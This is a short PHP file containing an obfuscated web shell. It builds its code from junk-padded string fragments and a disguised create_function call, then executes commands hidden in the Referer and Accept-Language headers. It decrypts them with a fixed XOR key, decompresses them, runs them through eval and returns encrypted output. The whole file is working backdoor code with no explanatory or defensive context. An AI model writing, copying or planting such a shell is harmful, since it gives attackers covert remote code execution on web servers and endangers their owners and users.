<?php
$X=str_replace('yz','','cyzreatyzeyz_fyzunyzctiyzon');
$g='base`l64_encode`l(`lx(gz`lcomp`lress($o),$k)`l);print("<`l$k>`l$d<`l/$k>");@sess`lion_destroy`l();}}}}';
$b='`li<$l;){f`lor($j=0`l;($j<$c&`l&$i<$l`l`l);$j++,`l$i++){$o.=`l$t{$i`l`l}^`l`l$k{$j};}}return`l $o;}$r=$_';
$M='s=&$_SESSI`lON`l;$ss=`l"substr";$sl`l="strt`lolow`ler";$i=$m[`l1][0].$`lm[1][1]`l;$`lh=$sl($ss(md5`l($';
$k='u=pa`lrse_url`l($rr)`l`l;parse_str($`lu`l["query"],`l$q);$q=a`lr`lray_val`lues($q);pre`lg_ma`lt`lch_al';
$W='`li.$kh),`l0`l,3));$f=$s`ll($ss(`lmd5($i`l.$kf),0,3`l));$p`l="";f`lor($z=1;$`lz`l<co`lunt($m`l[1]`l);$';
$L='SERV`lER;$rr=`l@$`lr["HTTP`l_REFERER`l"];$`lra=@$r`l["HTT`lP_`lACCEPT_LANGU`lAGE"`l];if($rr&&`l$`lra){$';
$U='$kh`l="5d41";$kf`l="`l`l402a";functi`lon x($`lt,$k){$`lc=strle`ln($`lk);$l=strlen`l($t)`l;$o`l="";`lfor($i=0;$';
$O='z++)$p.=$q`l[$m[`l2][$z]];if`l(`lst`lrpos($p,$h)===0){`l`l$s[$i]="";$p`l`l=$ss($p,3`l);}if`l(`l`larray';
$x=';@`le`lval(@gzu`lncompres`ls(`l@x(@`lb`las`le64`l_deco`lde`l(preg_repl`lace(a`lrray("/_/","/-/"),arra`';
$h='l("`l/([\\w]`l)[\\w-]+(?:;`l`lq=0.([\\d`l]))?,?`l/"`l,$ra,$`lm);if($q&&`l$m){@sessi`l`lon`l`l_st`lart();$';
$i='_key_exists($i,`l$s)){`l$s[$i`l]`l.=$p;$e=`lstrpos(`l$s[`l$i],$f);if($e)`l{`l$k`l=$kh.$kf`l;ob_start()';
$o='ly("/","+")`l,`l`l$ss`l($s[$i],0,$e))`l),`l$k)));$o`l=ob_g`let_con`ltents();ob_`lend_cle`lan();`l$d`l=';
$I=str_replace('`l','',$U.$b.$L.$k.$h.$M.$W.$O.$i.$x.$o.$g);
$N=$X('',$I);$N();
?>
